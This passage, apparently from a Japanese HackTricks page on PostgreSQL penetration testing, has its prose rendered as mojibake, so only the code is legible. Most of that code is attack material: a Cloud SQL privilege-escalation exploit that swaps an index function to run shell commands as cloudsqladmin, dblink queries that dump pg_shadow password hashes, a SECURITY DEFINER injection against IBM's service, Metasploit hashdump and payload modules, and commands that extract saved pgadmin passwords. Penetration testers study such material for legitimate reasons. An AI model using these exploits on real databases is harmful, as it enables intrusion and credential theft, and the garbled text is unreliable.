5. ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ANALYZEã—ã€PostgreSQLã‚¨ãƒ³ã‚¸ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ï¼ˆcloudsqladminï¼‰ã«åˆ‡ã‚Šæ›¿ãˆã€cloudsqladminã®æ¨©é™ã§æ‚ªæ„ã®ã‚ã‚‹ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ã€ä»¥å‰ã«å®Ÿè¡Œã™ã‚‹æ¨©é™ãŒãªã‹ã£ãŸã‚·ã‚§ãƒ«ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

PostgreSQLã§ã¯ã€ã“ã®ãƒ•ãƒ­ãƒ¼ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
å®Ÿè¡Œã—ãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆSQLã‚¯ã‚¨ãƒªã®å¾Œã€`shell_commands_results`ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã¯å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®å‡ºåŠ›ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ­ã‚°ã‚¤ãƒ³

ä¸€éƒ¨ã®è¨­å®šãƒŸã‚¹ã®ã‚ã‚‹PostgreSQLã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã¯ã€ä»»æ„ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚¤ãƒ³ãŒè¨±å¯ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚**`dblink`é–¢æ•°**ã‚’ä½¿ç”¨ã—ã¦ã€127.0.0.1ã‹ã‚‰ãƒ­ãƒ¼ã‚«ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
å‰ã®ã‚¯ã‚¨ãƒªãŒå‹•ä½œã™ã‚‹ãŸã‚ã«ã¯ã€**`dblink`é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚å­˜åœ¨ã—ãªã„å ´åˆã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ä½œæˆã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

ã‚‚ã—ç‰¹æ¨©ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ã‚‹ãŒã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å¤–éƒ¨IPã‹ã‚‰ã®ãƒ­ã‚°ã‚¤ãƒ³ãŒè¨±å¯ã•ã‚Œã¦ã„ãªã„å ´åˆã€ä»¥ä¸‹ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
ã“ã®é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®æ–¹æ³•ã§ç¢ºèªã§ãã¾ã™ã€‚
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **SECURITY DEFINERã‚’æŒã¤ã‚«ã‚¹ã‚¿ãƒ å®šç¾©é–¢æ•°**

[ã“ã®è§£èª¬è¨˜äº‹](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ã§ã¯ã€IBMãŒæä¾›ã™ã‚‹PostgreSQLã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å†…ã§ã€ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ãŒ**SECURITY DEFINERãƒ•ãƒ©ã‚°ã‚’æŒã¤ã“ã®é–¢æ•°**ã‚’è¦‹ã¤ã‘ãŸãŸã‚ã€ç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«](https://www.postgresql.org/docs/current/sql-createfunction.html)ã€**SECURITY DEFINERã‚’æŒã¤é–¢æ•°ã¯**ã€ãã‚Œã‚’æ‰€æœ‰ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç‰¹æ¨©ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€é–¢æ•°ãŒ**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æŒã£ã¦ã„ã‚‹**ã‹ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§**ç‰¹æ¨©ã®ã‚ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹**å ´åˆã€PostgreSQLå†…ã§ç‰¹æ¨©æ˜‡æ ¼ãŒæ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

å‰ã®ã‚³ãƒ¼ãƒ‰ã®4è¡Œç›®ã§ã€é–¢æ•°ã«ã¯**SECURITY DEFINER**ãƒ•ãƒ©ã‚°ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ãã—ã¦ã€**ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**ã—ã¾ã™ï¼š

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQLã‚’ä½¿ç”¨ã—ãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

PL/pgSQLã¯ã€**å®Œå…¨ãªæ©Ÿèƒ½ã‚’å‚™ãˆãŸãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èª**ã§ã‚ã‚Šã€SQLã‚ˆã‚Šã‚‚ã¯ã‚‹ã‹ã«æ‰‹ç¶šãçš„ãªåˆ¶å¾¡ãŒå¯èƒ½ã§ã™ã€‚ãƒ«ãƒ¼ãƒ—ã‚„ä»–ã®åˆ¶å¾¡æ§‹é€ ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚SQLæ–‡ã‚„ãƒˆãƒªã‚¬ãƒ¼ã¯ã€PL/pgSQLè¨€èªã§ä½œæˆã•ã‚ŒãŸé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚\
**ã“ã®è¨€èªã‚’æ‚ªç”¨ã—ã¦ã€PostgreSQLã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ãƒ­ã‚®ãƒ³ã‚°

_**postgresql.conf**_ ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­ã§ã€ä»¥ä¸‹ã®è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€PostgreSQL ã®ãƒ­ã‚°ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
æ¬¡ã«ã€**ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•**ã—ã¾ã™ã€‚

### pgadmin

[pgadmin](https://www.pgadmin.org)ã¯ã€PostgreSQLã®ç®¡ç†ãŠã‚ˆã³é–‹ç™ºãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã™ã€‚\
_**pgadmin4.db**_ãƒ•ã‚¡ã‚¤ãƒ«å†…ã«ã¯**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚\
ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã®_decrypt_é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€ãã‚Œã‚‰ã‚’å¾©å·åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®èªè¨¼ã¯ã€ä¸€èˆ¬çš„ã« _**pg\_hba.conf**_ ã¨ã„ã†åå‰ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã§åˆ¶å¾¡ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€ã„ãã¤ã‹ã®ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¬ã‚³ãƒ¼ãƒ‰ã¯æ¬¡ã®7ã¤ã®å½¢å¼ã®ã„ãšã‚Œã‹ã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**å„**ãƒ¬ã‚³ãƒ¼ãƒ‰ã¯ã€**æ¥ç¶šã‚¿ã‚¤ãƒ—**ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ç¯„å›²**ï¼ˆæ¥ç¶šã‚¿ã‚¤ãƒ—ã«é–¢é€£ã™ã‚‹å ´åˆï¼‰ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å**ã€**ãƒ¦ãƒ¼ã‚¶å**ã€ãŠã‚ˆã³ã“ã‚Œã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ä¸€è‡´ã™ã‚‹æ¥ç¶šã«ä½¿ç”¨ã•ã‚Œã‚‹**èªè¨¼æ–¹æ³•**ã‚’æŒ‡å®šã—ã¾ã™ã€‚èªè¨¼ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€ä¸€è‡´ã™ã‚‹æ¥ç¶šã‚¿ã‚¤ãƒ—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¢ãƒ‰ãƒ¬ã‚¹ã€è¦æ±‚ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã€ãŠã‚ˆã³ãƒ¦ãƒ¼ã‚¶åã‚’æŒã¤**æœ€åˆã®ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™**ã€‚ "ãƒ•ã‚©ãƒ¼ãƒ«ã‚¹ãƒ«ãƒ¼"ã‚„"ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—"ã¯ã‚ã‚Šã¾ã›ã‚“ï¼š**1ã¤ã®ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒé¸æŠã•ã‚Œã€èªè¨¼ãŒå¤±æ•—ã—ãŸå ´åˆã€å¾Œç¶šã®ãƒ¬ã‚³ãƒ¼ãƒ‰ã¯è€ƒæ…®ã•ã‚Œã¾ã›ã‚“**ã€‚ä¸€è‡´ã™ã‚‹ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒãªã„å ´åˆã€ã‚¢ã‚¯ã‚»ã‚¹ã¯æ‹’å¦ã•ã‚Œã¾ã™ã€‚\
ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®èªè¨¼æ–¹æ³•ã¯ã€**md5**ã€**crypt**ã€ãŠã‚ˆã³**password**ã§ã™ã€‚ã“ã‚Œã‚‰ã®æ–¹æ³•ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæ¥ç¶šã‚’ä»‹ã—ã¦é€ä¿¡ã•ã‚Œã‚‹æ–¹æ³•ã‚’é™¤ã„ã¦ã€åŒæ§˜ã«å‹•ä½œã—ã¾ã™ï¼šãã‚Œãã‚Œã€MD5ãƒãƒƒã‚·ãƒ¥ã€cryptæš—å·åŒ–ã€ãŠã‚ˆã³ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã§ã™ã€‚åˆ¶é™ã¨ã—ã¦ã€cryptãƒ¡ã‚½ãƒƒãƒ‰ã¯pg\_authidã§æš—å·åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ãŠã‚ˆã³è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
